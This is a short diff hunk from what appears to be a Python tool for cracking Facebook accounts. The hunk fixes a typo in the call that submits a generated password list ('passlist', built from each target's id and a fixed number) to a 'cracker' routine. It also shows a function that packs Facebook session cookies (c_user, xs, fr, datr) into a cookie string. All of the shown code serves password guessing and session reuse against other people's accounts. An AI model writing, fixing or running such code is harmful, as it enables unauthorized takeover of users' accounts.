@@ -242,7 +242,7 @@ def main():
             v = ids[:8]
             b = next[:6]  
             passlist = [mk,xx,'57273200',v]
-            Submits.submit(crackerr,ids,passlist)
+            Submits.submit(cracker,ids,passlist)
 
 def convert(cookie):
     cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
